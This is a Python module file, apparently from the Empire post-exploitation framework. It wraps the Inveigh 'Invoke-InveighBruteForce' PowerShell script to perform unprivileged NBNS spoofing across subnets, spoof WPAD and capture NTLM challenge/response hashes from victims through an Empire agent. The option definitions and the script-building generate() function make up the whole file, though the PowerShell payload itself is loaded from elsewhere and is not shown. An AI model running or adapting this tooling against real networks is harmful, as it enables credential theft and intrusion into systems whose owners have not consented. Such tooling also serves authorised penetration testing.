from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-InveighBruteForce',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh\'s remote (Hot Potato method)/unprivileged NBNS brute force spoofer function. '
                            'This module can be used to perform NBNS spoofing across subnets and/or perform NBNS '
                            'spoofing without an elevated administrator or SYSTEM shell.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh' 
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SpooferIP' : {
                'Description'   :   'Specific IP address for NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh Brute Force host.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferTarget' : {
                'Description'   :   'IP address to target for brute force NBNS spoofing.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Hostname' : {
                'Description'   :   'Hostname to spoof with NBNS spoofing.',
                'Required'      :   False,
                'Value'         :   'WPAD'
            },
            'NBNS' : {
                'Description'   :   'Enable/Disable NBNS spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'NBNSPause' : {
                'Description'   :   'Number of seconds the NBNS brute force spoofer will stop spoofing after an incoming HTTP request is received.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNSTTL' : {
                'Description'   :   'Custom NBNS TTL in seconds for the response packet.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTP' : {
                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'HTTPAuth' : {
                'Description'   :   'HTTP server authentication type. This setting does not apply to wpad.dat requests (Anonymous,Basic,NTLM).',
                'Required'      :   False,
                'Value'         :   'NTLM'
            },
            'HTTPBasicRealm' : {
                'Description'   :   'Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.',
                'Required'      :   False,
                'Value'         :   'IIS'
            },
            'HTTPResponse' : {
                'Description'   :   'String or HTML to serve as the default HTTP response. This response will not be used for wpad.dat requests. Do not wrap in quotes and use PowerShell character escapes where necessary.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADAuth' : {
                'Description'   :   'HTTP server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts (Anonymous,Basic,NTLM).',
                'Required'      :   False,
                'Value'         :   'NTLM'
            },
            'WPADIP' : {
                'Description'   :   'Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADPort' : {
                'Description'   :   'Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADDirectHosts' : {
                'Description'   :   'Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy. Add the Empire host to avoid catching Empire HTTP traffic.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Challenge' : {
                'Description'   :   'Specific 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'MachineAccounts' : {
                'Description'   :   'Enable/Disable showing NTLM challenge/response captures from machine accounts (Y/N).',
                'Required'      :   False,
                'Value'         :   'N'
            },
            'RunCount' : {
                'Description'   :   'Number of captures to perform before auto-exiting.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RunTime' : {
                'Description'   :   'Run time duration in minutes.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-InveighBruteForce.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # set defaults for Empire
        script += "\n" + 'Invoke-InveighBruteForce -Tool "2" '

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            script += " -" + str(option) + " " + quoted
                        else:
                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script
